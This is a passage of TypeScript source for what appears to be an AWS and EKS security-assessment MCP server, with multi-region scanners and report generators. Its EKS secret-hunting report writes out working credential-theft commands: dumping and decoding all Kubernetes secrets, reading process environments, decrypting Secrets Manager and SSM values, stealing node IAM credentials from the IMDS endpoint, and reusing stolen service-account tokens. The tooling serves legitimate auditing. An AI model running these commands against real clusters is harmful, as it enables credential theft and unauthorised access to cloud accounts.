kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'
\`\`\`

### 8. Test IMDS access from pod (should be blocked)
\`\`\`bash
kubectl exec -it <pod> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`
`;

    const oidcInfo = cluster.identity?.oidc?.issuer ? `**OIDC Issuer:** ${cluster.identity.oidc.issuer}` : '';
    
    let findingsText = '';
    for (const f of findings) {
      findingsText += `### ${f.id}: ${f.name}\n`;
      findingsText += `**Severity:** ${f.severity}\n`;
      findingsText += `**MITRE ATT&CK:** ${f.mitre}\n\n`;
      findingsText += `${f.description}\n\n`;
      findingsText += `**Detection:**\n\`\`\`bash\n${f.test}\n\`\`\`\n\n`;
      findingsText += `**Remediation:**\n\`\`\`bash\n${f.remediation}\n\`\`\`\n\n`;
      if (f.payload) {
        findingsText += `**Exploitation:**\n\`\`\`bash\n${f.payload}\n\`\`\`\n\n`;
      }
      findingsText += '---\n\n';
    }

    const report = `# EKS Service Account Security Analysis

## Cluster: ${clusterName}
**Region:** ${region}
**Kubernetes Version:** ${cluster.version}
**Platform Version:** ${cluster.platformVersion}
**Scan Time:** ${new Date().toISOString()}

## Risk Assessment
- **Risk Score:** ${riskScore}/100
- **Risk Level:** ${riskScore >= 50 ? 'CRITICAL' : riskScore >= 30 ? 'HIGH' : riskScore >= 15 ? 'MEDIUM' : 'LOW'}
- **Findings:** ${findings.length}

## Cluster Security Configuration
| Setting | Status |
|---------|--------|
| OIDC Provider (IRSA) | ${cluster.identity?.oidc?.issuer ? '[OK] Configured' : '[FAIL] Not Configured'} |
| Secrets Encryption | ${cluster.encryptionConfig?.length ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Public Endpoint | ${cluster.resourcesVpcConfig?.endpointPublicAccess ? '[WARN] Yes' : '[OK] No'} |
| Private Endpoint | ${cluster.resourcesVpcConfig?.endpointPrivateAccess ? '[OK] Yes' : '[FAIL] No'} |
| Control Plane Logging | ${loggingEnabled ? '[OK] Enabled' : '[FAIL] Disabled'} |

${oidcInfo}

## Findings

${findingsText}

${saAnalysisCommands}`;

    return report;
  } catch (error: any) {
    return `Error scanning EKS service accounts: ${error.message}`;
  }
}

async function huntEKSSecrets(region: string, clusterName: string): Promise<string> {
  const eksClient = new EKSClient({ region });
  
  try {
    const clusterResponse = await eksClient.send(new DescribeClusterCommand({ name: clusterName }));
    const cluster = clusterResponse.cluster;
    
    if (!cluster) {
      return `Error: Cluster ${clusterName} not found in region ${region}`;
    }

    const irsaStatus = cluster.identity?.oidc?.issuer 
      ? '[OK] Enabled - Pods should use IRSA instead' 
      : '[FAIL] Disabled - Pods likely using node role!';

    const report = `# EKS Secret Hunting Guide

## Cluster: ${clusterName}
**Region:** ${region}
**Kubernetes Version:** ${cluster.version}
**Scan Time:** ${new Date().toISOString()}

## Cluster Secret Configuration
| Feature | Status |
|---------|--------|
| IRSA (OIDC Provider) | ${cluster.identity?.oidc?.issuer ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Secrets Encryption | ${cluster.encryptionConfig?.length ? '[OK] KMS Encrypted' : '[FAIL] Not Encrypted'} |
| Private Endpoint | ${cluster.resourcesVpcConfig?.endpointPrivateAccess ? '[OK] Yes' : '[FAIL] No'} |

---

## Secret Hunting Commands

### 1. Enumerate All Kubernetes Secrets (TC-SECRET-001)
**Risk:** CRITICAL | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# List all secrets
kubectl get secrets -A

# Get secret type distribution
kubectl get secrets -A -o json | jq -r '.items[] | .type' | sort | uniq -c

# Find interesting secrets by name
kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.type)"' | grep -iE "password|token|key|cred|secret|api|db|aws"

# Dump all secrets (DANGEROUS)
kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data | to_entries[] | "  \\(.key): \\(.value | @base64d)")"'
\`\`\`

---

### 2. Secrets in Environment Variables (TC-SECRET-002)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Find pods with secrets in env vars
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].env[]?.valueFrom.secretKeyRef != null) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# From compromised pod - read env vars
env | grep -iE "password|secret|token|key|aws"
cat /proc/1/environ | tr '\\0' '\\n' | grep -iE "password|secret|token"
\`\`\`

---

### 3. AWS Secrets Manager Hunting (TC-SECRET-006)
**Risk:** HIGH | **MITRE:** T1552.005 - Cloud Instance Metadata API

\`\`\`bash
# From pod with AWS access (IRSA or node role)
# List Secrets Manager secrets
aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]' --output table

# Get secret value
aws secretsmanager get-secret-value --secret-id "<secret-name>" --query 'SecretString' --output text
\`\`\`

---

### 4. SSM Parameter Store Hunting (TC-SECRET-006)
**Risk:** HIGH | **MITRE:** T1552.005 - Cloud Instance Metadata API

\`\`\`bash
# List SSM Parameters
aws ssm describe-parameters --query 'Parameters[*].[Name,Type]' --output table

# Get SecureString parameter with decryption
aws ssm get-parameter --name "<param-name>" --with-decryption --query 'Parameter.Value' --output text

# Get all parameters by path
aws ssm get-parameters-by-path --path "/prod/" --recursive --with-decryption
\`\`\`

---

### 5. IMDS Credential Theft (TC-SA-005)
**Risk:** CRITICAL | **MITRE:** T1552.005 - Cloud Instance Metadata API
**IRSA Status:** ${irsaStatus}

\`\`\`bash
# Without IRSA, steal node's IAM credentials via IMDS
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "Node Role: $ROLE"

CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
echo "$CREDS"

# Extract and use credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)

# Node role often has excessive permissions
aws s3 ls
aws ec2 describe-instances
aws secretsmanager list-secrets
\`\`\`

---

### 6. Secrets in ConfigMaps (TC-SECRET-003)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Search ConfigMaps for sensitive keywords
kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[]? | .value' | grep -iE "password|secret|token|AKIA|aws_access_key"
\`\`\`

---

### 7. Mounted Secret Files (TC-SECRET-004)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Find pods with secret volume mounts
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.secret != null) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# From compromised pod - find secrets
find / -name "*.key" -o -name "*.pem" -o -name "*secret*" 2>/dev/null

# Common paths
cat /var/run/secrets/kubernetes.io/serviceaccount/token
\`\`\`

---

### 8. Service Account Token Theft (TC-SECRET-009)
**Risk:** CRITICAL | **MITRE:** T1528 - Steal Application Access Token

\`\`\`bash
# Find SA token secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'

# From compromised pod - steal token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Check permissions
kubectl auth can-i --list --token=$TOKEN

# Use token
kubectl --token=$TOKEN get pods -A
\`\`\`

---

## Remediation Summary

1. **Enable IRSA** - Associate OIDC provider and use IAM roles per service account
2. **Enable secrets encryption** - Use KMS key for etcd encryption
3. **Block IMDS** - Use launch template to disable IMDSv1 or block via network policy
4. **Disable automountServiceAccountToken** on default SA
5. **Use projected tokens** with short expiration
6. **Restrict secrets access** via RBAC
7. **Use External Secrets Operator** to sync from AWS Secrets Manager
`;

    return report;
  } catch (error: any) {
    return `Error hunting EKS secrets: ${error.message}`;
  }
}

// ========== MULTI-REGION SCANNING FUNCTIONS ==========

interface RegionResult {
  region: string;
  resourceCount: number;
  findings: string[];
  error?: string;
}

async function scanRegionForEC2(region: string): Promise<RegionResult> {
  try {
    const client = new EC2Client({ region });
    const response = await client.send(new DescribeInstancesCommand({}));
    const instances: any[] = [];
    const findings: string[] = [];
    
    for (const reservation of response.Reservations || []) {
      for (const instance of reservation.Instances || []) {
        instances.push(instance);
        if (instance.PublicIpAddress) {
          findings.push(`[CRITICAL] ${instance.InstanceId} has public IP: ${instance.PublicIpAddress}`);
        }
        if (instance.IamInstanceProfile) {
          findings.push(`[MEDIUM] ${instance.InstanceId} has IAM role: ${instance.IamInstanceProfile.Arn?.split("/").pop()}`);
        }
      }
    }
    
    return { region, resourceCount: instances.length, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForLambda(region: string): Promise<RegionResult> {
  try {
    const client = new LambdaClient({ region });
    const response = await client.send(new ListFunctionsCommand({}));
    const findings: string[] = [];
    
    for (const fn of response.Functions || []) {
      if (fn.VpcConfig?.VpcId) {
        findings.push(`[LOW] ${fn.FunctionName} is in VPC: ${fn.VpcConfig.VpcId}`);
      } else {
        findings.push(`[MEDIUM] ${fn.FunctionName} is NOT in VPC (public internet)`);
      }
      if (fn.Environment?.Variables) {
        const envKeys = Object.keys(fn.Environment.Variables);
        const sensitiveKeys = envKeys.filter(k => 
          /secret|password|key|token|api/i.test(k)
        );
        if (sensitiveKeys.length > 0) {
          findings.push(`[CRITICAL] ${fn.FunctionName} has sensitive env vars: ${sensitiveKeys.join(", ")}`);
        }
      }
    }
    
    return { region, resourceCount: response.Functions?.length || 0, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForRDS(region: string): Promise<RegionResult> {
  try {
    const client = new RDSClient({ region });
    const response = await client.send(new DescribeDBInstancesCommand({}));
    const findings: string[] = [];
    
    for (const db of response.DBInstances || []) {
      if (db.PubliclyAccessible) {
        findings.push(`[CRITICAL] CRITICAL: ${db.DBInstanceIdentifier} is publicly accessible!`);
      }
      if (!db.StorageEncrypted) {
        findings.push(`[CRITICAL] ${db.DBInstanceIdentifier} storage is NOT encrypted`);
      }
      if (!db.DeletionProtection) {
        findings.push(`[MEDIUM] ${db.DBInstanceIdentifier} has no deletion protection`);
      }
    }
    
    return { region, resourceCount: response.DBInstances?.length || 0, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForEKS(region: string): Promise<RegionResult> {
  try {
    const client = new EKSClient({ region });
    const response = await client.send(new ListClustersCommand({}));
    const findings: string[] = [];
    
    for (const clusterName of response.clusters || []) {
      try {
        const clusterResponse = await client.send(new DescribeClusterCommand({ name: clusterName }));
        const cluster = clusterResponse.cluster;
        
        if (cluster?.resourcesVpcConfig?.endpointPublicAccess) {
          findings.push(`[MEDIUM] ${clusterName} has public API endpoint`);
        }
        if (!cluster?.encryptionConfig || cluster.encryptionConfig.length === 0) {
          findings.push(`[CRITICAL] ${clusterName} secrets NOT encrypted at rest`);
        }
        if (!cluster?.logging?.clusterLogging?.some(l => l.enabled)) {
          findings.push(`[MEDIUM] ${clusterName} logging disabled`);
        }
      } catch (e) {
        findings.push(`[WARN] Could not describe cluster: ${clusterName}`);
      }
    }
    
    return { region, resourceCount: response.clusters?.length || 0, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForSecrets(region: string): Promise<RegionResult> {
  try {
    const client = new SecretsManagerClient({ region });
    const response = await client.send(new ListSecretsCommand({}));
    const findings: string[] = [];
    
    for (const secret of response.SecretList || []) {
      if (!secret.KmsKeyId) {
        findings.push(`[MEDIUM] ${secret.Name} using default AWS KMS (consider CMK)`);
      }
      if (!secret.RotationEnabled) {
        findings.push(`[CRITICAL] ${secret.Name} rotation NOT enabled`);
      }
      if (secret.LastAccessedDate) {
        const daysSinceAccess = Math.floor((Date.now() - secret.LastAccessedDate.getTime()) / (1000 * 60 * 60 * 24));
        if (daysSinceAccess > 90) {
          findings.push(`[MEDIUM] ${secret.Name} not accessed in ${daysSinceAccess} days (stale?)`);
        }
      }
    }
    
    return { region, resourceCount: response.SecretList?.length || 0, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForGuardDuty(region: string): Promise<RegionResult> {
  try {
    const client = new GuardDutyClient({ region });
    const detectorsResponse = await client.send(new ListDetectorsCommand({}));
    const findings: string[] = [];
    
    if (!detectorsResponse.DetectorIds || detectorsResponse.DetectorIds.length === 0) {
      findings.push(`[CRITICAL] CRITICAL: GuardDuty NOT enabled in ${region}!`);
      return { region, resourceCount: 0, findings };
    }
    
    for (const detectorId of detectorsResponse.DetectorIds) {
      const findingsResponse = await client.send(new ListFindingsCommand({
        DetectorId: detectorId,
        FindingCriteria: {
          Criterion: {
            "severity": { Gte: 4 } // Medium and above
          }
        },
        MaxResults: 50
      }));
      
      if (findingsResponse.FindingIds && findingsResponse.FindingIds.length > 0) {
        findings.push(`[CRITICAL] ${findingsResponse.FindingIds.length} active GuardDuty findings (severity >= Medium)`);
        
        const detailedFindings = await client.send(new GetFindingsCommand({
          DetectorId: detectorId,
          FindingIds: findingsResponse.FindingIds.slice(0, 10)
        }));
        
        for (const finding of detailedFindings.Findings || []) {
          findings.push(`  - ${finding.Type}: ${finding.Title} (Severity: ${finding.Severity})`);
        }
      } else {
        findings.push(`[LOW] No active GuardDuty findings`);
      }
    }
    
    return { region, resourceCount: detectorsResponse.DetectorIds.length, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForElastiCache(region: string): Promise<RegionResult> {
  try {
    const client = new ElastiCacheClient({ region });
    const response = await client.send(new DescribeCacheClustersCommand({}));
    const findings: string[] = [];
    
    for (const cluster of response.CacheClusters || []) {
      if (!cluster.TransitEncryptionEnabled) {
        findings.push(`[CRITICAL] ${cluster.CacheClusterId} transit encryption disabled`);
      }
      if (!cluster.AtRestEncryptionEnabled) {
        findings.push(`[CRITICAL] ${cluster.CacheClusterId} at-rest encryption disabled`);
      }
      if (!cluster.AuthTokenEnabled) {
        findings.push(`[MEDIUM] ${cluster.CacheClusterId} AUTH not enabled`);
      }
    }
    
    return { region, resourceCount: response.CacheClusters?.length || 0, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

async function scanRegionForVPC(region: string): Promise<RegionResult> {
  try {
    const client = new EC2Client({ region });
    const response = await client.send(new DescribeVpcsCommand({}));
    const findings: string[] = [];
    
    for (const vpc of response.Vpcs || []) {
      const vpcName = vpc.Tags?.find(t => t.Key === "Name")?.Value || vpc.VpcId;
      if (vpc.IsDefault) {
        findings.push(`[MEDIUM] ${vpcName} is the DEFAULT VPC (consider using custom VPC)`);
      }
      
      // Check for flow logs
      // Note: Would need additional API call to fully check
      findings.push(`[INFO] ${vpcName}: ${vpc.CidrBlock}`);
    }
    
    return { region, resourceCount: response.Vpcs?.length || 0, findings };
  } catch (error: any) {
    return { region, resourceCount: 0, findings: [], error: error.message };
  }
}

// Parallel execution helper with concurrency limit
async function parallelScan<T>(
  items: string[],
  fn: (item: string) => Promise<T>,
  concurrency: number = 5
): Promise<T[]> {
  const results: T[] = [];
  
  for (let i = 0; i < items.length; i += concurrency) {
    const batch = items.slice(i, i + concurrency);
    const batchResults = await Promise.all(batch.map(fn));
    results.push(...batchResults);
  }
  
  return results;
}

// Helper to parse custom regions string
function parseRegions(regionsInput?: string, scanMode?: string): string[] {
  if (regionsInput) {
    // Custom regions provided - parse comma-separated list
    const customRegions = regionsInput.split(',').map(r => r.trim().toLowerCase()).filter(r => r);
    
    // Validate regions
    const invalidRegions = customRegions.filter(r => !AWS_REGIONS.includes(r));
    if (invalidRegions.length > 0) {
      console.error(`Warning: Invalid regions ignored: ${invalidRegions.join(', ')}`);
    }
    
    const validRegions = customRegions.filter(r => AWS_REGIONS.includes(r));
    if (validRegions.length === 0) {
      throw new Error(`No valid regions provided. Valid regions: ${AWS_REGIONS.slice(0, 5).join(', ')}...`);
    }
    return validRegions;
  }
  
  // Use preset mode
  return scanMode === "all" ? AWS_REGIONS : COMMON_REGIONS;
}

async function scanAllRegions(
  resourceType: string,
  scanMode?: string,
  parallelism?: number,
  regionsInput?: string
): Promise<string> {
  const regions = parseRegions(regionsInput, scanMode);
  const concurrency = Math.min(parallelism || 5, 10);
  
  // Determine mode description
  let modeDesc: string;
  if (regionsInput) {
    modeDesc = `Custom (${regions.length} region${regions.length > 1 ? 's' : ''}): ${regions.join(', ')}`;
  } else {
    modeDesc = scanMode === "all" ? "All Regions (30+)" : "Common Regions (11)";
  }
  
  let output = `# Multi-Region Scan: ${resourceType.toUpperCase()}\n\n`;
  output += `**Mode:** ${modeDesc}\n`;
  output += `**Parallelism:** ${concurrency} concurrent scans\n`;
  output += `**Timestamp:** ${new Date().toISOString()}\n\n`;
  output += `---\n\n`;
  
  let results: RegionResult[] = [];
  let totalResources = 0;
  let totalFindings = 0;
  const activeRegions: string[] = [];
  const errorRegions: string[] = [];
  
  // Select scanner based on resource type
  const scanners: Record<string, (region: string) => Promise<RegionResult>> = {
    ec2: scanRegionForEC2,
    lambda: scanRegionForLambda,
    rds: scanRegionForRDS,
    eks: scanRegionForEKS,
    secrets: scanRegionForSecrets,
    guardduty: scanRegionForGuardDuty,
    elasticache: scanRegionForElastiCache,
    vpc: scanRegionForVPC,
  };
  
  if (resourceType === "all") {
    // Scan all resource types
    output += `## Scanning ALL resource types across ${regions.length} regions...\n\n`;
    
    for (const [type, scanner] of Object.entries(scanners)) {
      output += `### ${type.toUpperCase()}\n\n`;
      const typeResults = await parallelScan(regions, scanner, concurrency);
      
      for (const result of typeResults) {
        if (result.error) {
          continue;
        }
        if (result.resourceCount > 0) {
          totalResources += result.resourceCount;
          totalFindings += result.findings.length;
          output += `**${result.region}**: ${result.resourceCount} resources\n`;
          for (const finding of result.findings.slice(0, 5)) {
            output += `  ${finding}\n`;
          }
          if (result.findings.length > 5) {
            output += `  ... and ${result.findings.length - 5} more findings\n`;
          }
          output += `\n`;
        }
      }
    }
  } else {
    const scanner = scanners[resourceType];
    if (!scanner) {
      return `Unknown resource type: ${resourceType}. Supported: ${Object.keys(scanners).join(", ")}`;
    }
    
    output += `## Scanning ${regions.length} regions for ${resourceType}...\n\n`;
    results = await parallelScan(regions, scanner, concurrency);
    
    // Process results
    for (const result of results) {
      if (result.error) {
        errorRegions.push(`${result.region}: ${result.error}`);
        continue;
      }
      
      if (result.resourceCount > 0) {
        activeRegions.push(result.region);
        totalResources += result.resourceCount;
        totalFindings += result.findings.length;
        
        output += `### ${result.region}\n`;
        output += `**Resources Found:** ${result.resourceCount}\n\n`;
        
        if (result.findings.length > 0) {
          output += `**Findings:**\n`;
          for (const finding of result.findings) {
            output += `- ${finding}\n`;
          }
          output += `\n`;
        }
      }
    }
    
    // Empty regions summary
    const emptyRegions = regions.filter(r => 
      !activeRegions.includes(r) && !errorRegions.some(e => e.startsWith(r))
    );
    
    if (emptyRegions.length > 0) {
      output += `### Empty Regions\n`;
      output += `No ${resourceType} resources found in: ${emptyRegions.join(", ")}\n\n`;
    }
  }
  
  // Summary
  output += `---\n\n`;
  output += `## Summary\n\n`;
  output += `| Metric | Value |\n`;
  output += `|--------|-------|\n`;
  output += `| Regions Scanned | ${regions.length} |\n`;
  output += `| Active Regions | ${activeRegions.length} |\n`;
  output += `| Total Resources | ${totalResources} |\n`;
  output += `| Total Findings | ${totalFindings} |\n`;
  
  if (errorRegions.length > 0) {
    output += `| Errors | ${errorRegions.length} |\n\n`;
    output += `### Errors\n`;
    for (const err of errorRegions.slice(0, 10)) {
      output += `- ${err}\n`;
    }
  }
  
  // Critical findings highlight
  const criticalKeywords = ["CRITICAL", "[CRITICAL]"];
  output += `\n## [CRITICAL] Critical Findings\n\n`;
  let criticalCount = 0;
  for (const result of results) {
    for (const finding of result.findings) {
      if (criticalKeywords.some(kw => finding.includes(kw))) {
        output += `- **${result.region}**: ${finding}\n`;
        criticalCount++;
      }
    }
  }
  if (criticalCount === 0) {
    output += `No critical findings detected! [OK]\n`;
  }
  
  return output;
}

async function listActiveRegions(scanMode?: string, regionsInput?: string): Promise<string> {
  const regions = parseRegions(regionsInput, scanMode);
  
  // Determine mode description
  let modeDesc: string;
  if (regionsInput) {
    modeDesc = `Custom (${regions.length} region${regions.length > 1 ? 's' : ''}): ${regions.join(', ')}`;
  } else {
    modeDesc = scanMode === "all" ? "All Regions (30+)" : "Common Regions (11)";
  }
  
  let output = `# Active AWS Regions Discovery\n\n`;
  output += `**Mode:** ${modeDesc}\n`;
  output += `**Timestamp:** ${new Date().toISOString()}\n\n`;
  
  interface RegionActivity {
    region: string;
    ec2: number;
    lambda: number;
    rds: number;
    total: number;
  }
  
  const activities: RegionActivity[] = [];
  
  // Quick parallel scan of all regions
  const scanRegion = async (region: string): Promise<RegionActivity> => {
    let ec2 = 0, lambda = 0, rds = 0;
    
    try {
      const ec2Client = new EC2Client({ region });
      const ec2Response = await ec2Client.send(new DescribeInstancesCommand({ MaxResults: 5 }));
      for (const r of ec2Response.Reservations || []) {
        ec2 += r.Instances?.length || 0;
      }
    } catch (e) {}
    
    try {
      const lambdaClient = new LambdaClient({ region });
      const lambdaResponse = await lambdaClient.send(new ListFunctionsCommand({ MaxItems: 5 }));
      lambda = lambdaResponse.Functions?.length || 0;
    } catch (e) {}
    
    try {
      const rdsClient = new RDSClient({ region });
      const rdsResponse = await rdsClient.send(new DescribeDBInstancesCommand({ MaxRecords: 5 }));
      rds = rdsResponse.DBInstances?.length || 0;
    } catch (e) {}
    
    return { region, ec2, lambda, rds, total: ec2 + lambda + rds };
  };
  
  const results = await parallelScan(regions, scanRegion, 10);
  
  // Filter and sort by activity
  const activeRegions = results.filter(r => r.total > 0).sort((a, b) => b.total - a.total);
  const inactiveRegions = results.filter(r => r.total === 0);
  
  output += `## Active Regions (${activeRegions.length})\n\n`;
  output += `| Region | EC2 | Lambda | RDS | Total |\n`;
  output += `|--------|-----|--------|-----|-------|\n`;
  
  for (const r of activeRegions) {
    output += `| ${r.region} | ${r.ec2} | ${r.lambda} | ${r.rds} | ${r.total} |\n`;
  }
  
  output += `\n## Inactive Regions (${inactiveRegions.length})\n`;
  output += inactiveRegions.map(r => r.region).join(", ") + "\n\n";
  
  output += `## Recommendations\n\n`;
  if (activeRegions.length > 0) {
    output += `Focus your detailed scans on these regions:\n`;
    for (const r of activeRegions.slice(0, 5)) {
      output += `- \`${r.region}\` (${r.total} resources)\n`;
    }
    output += `\n**Command Example:**\n`;
    output += `\`\`\`\n`;
    output += `scan_all_regions --resourceType ec2 --scanMode all\n`;
    output += `\`\`\`\n`;
  } else {
    output += `No resources found in scanned regions. Try:\n`;
    output += `- Check AWS credentials have correct permissions\n`;
    output += `- Use \`scanMode: "all"\` to scan all 30+ regions\n`;
  }
  
  return output;
}

// Start the server
async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Nimbus MCP Server running on stdio");
  console.error(`Default region: ${DEFAULT_REGION}`);
  console.error("Authentication: Using AWS credentials from environment/config");
}

main().catch((error) => {
  console.error("Fatal error:", error);
  process.exit(1);
});


